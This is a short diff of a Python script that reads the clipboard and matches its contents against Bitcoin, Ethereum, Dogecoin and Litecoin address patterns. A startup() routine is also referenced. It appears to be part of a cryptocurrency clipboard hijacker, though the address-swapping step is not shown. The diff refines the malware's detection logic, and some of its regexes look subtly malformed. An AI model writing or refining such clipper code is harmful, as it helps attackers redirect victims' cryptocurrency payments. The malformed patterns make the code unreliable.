@@ -28,7 +28,6 @@ startup()
 def match():
     clipboard = str(pyperclip.paste())
     btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
-    btc_match_2 = re.match("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
     eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
     doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
     ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
